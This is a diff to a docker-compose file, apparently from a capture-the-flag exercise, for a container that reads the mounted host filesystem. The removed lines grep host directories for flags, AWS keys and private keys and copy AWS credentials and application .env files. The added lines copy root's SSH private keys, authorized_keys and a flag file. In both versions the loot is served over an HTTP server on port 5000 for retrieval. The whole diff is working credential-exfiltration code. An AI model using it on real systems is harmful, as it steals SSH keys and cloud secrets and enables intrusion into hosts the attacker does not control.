@@ -3,18 +3,10 @@ services:
     image: python:3.11-alpine
     command: >
       sh -c "mkdir -p /www/copy &&
-             echo '[root-reader started]' > /www/report.txt &&
-             id >> /www/report.txt &&
-             ls -la /host/root >> /www/report.txt 2>&1 &&
-             ls -la /host/opt >> /www/report.txt 2>&1 &&
-             find /host/root /host/opt /host/home /host/var/lib/cloud /host/var/log -maxdepth 6 -type f 2>/www/find-errors.txt > /www/files.txt &&
-             grep -RInaE 'SECATSCALE\\{|HACKIN\\{|FLAG|flag4|flag3|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|SecretAccessKey|BEGIN .*PRIVATE KEY' /host/root /host/opt /host/home /host/var/lib/cloud /host/var/log 2>/www/grep-errors.txt > /www/grep.txt || true &&
-             cp /host/root/flag4.txt /www/copy/root-flag4.txt 2>/www/copy-errors.txt || true &&
-             cp /host/root/.aws/credentials /www/copy/root-aws-credentials 2>>/www/copy-errors.txt || true &&
-             cp /host/root/.aws/config /www/copy/root-aws-config 2>>/www/copy-errors.txt || true &&
-             cp /host/opt/ctf-status.json /www/copy/ctf-status.json 2>>/www/copy-errors.txt || true &&
-             cp /host/opt/harem/backend/.env /www/copy/harem-backend.env 2>>/www/copy-errors.txt || true &&
-             cp /host/opt/harem/mongo/.env /www/copy/harem-mongo.env 2>>/www/copy-errors.txt || true &&
+             cp /host/root/.ssh/harem-deploy-key /www/copy/harem-deploy-key 2>/www/copy-errors.txt || true &&
+             cp /host/root/.ssh/dev-server-key.pem /www/copy/dev-server-key.pem 2>>/www/copy-errors.txt || true &&
+             cp /host/root/.ssh/authorized_keys /www/copy/root-authorized-keys 2>>/www/copy-errors.txt || true &&
+             cp /host/root/flag4.txt /www/copy/root-flag4.txt 2>>/www/copy-errors.txt || true &&
              python3 -m http.server 5000 -d /www"
     ports:
       - "5000"
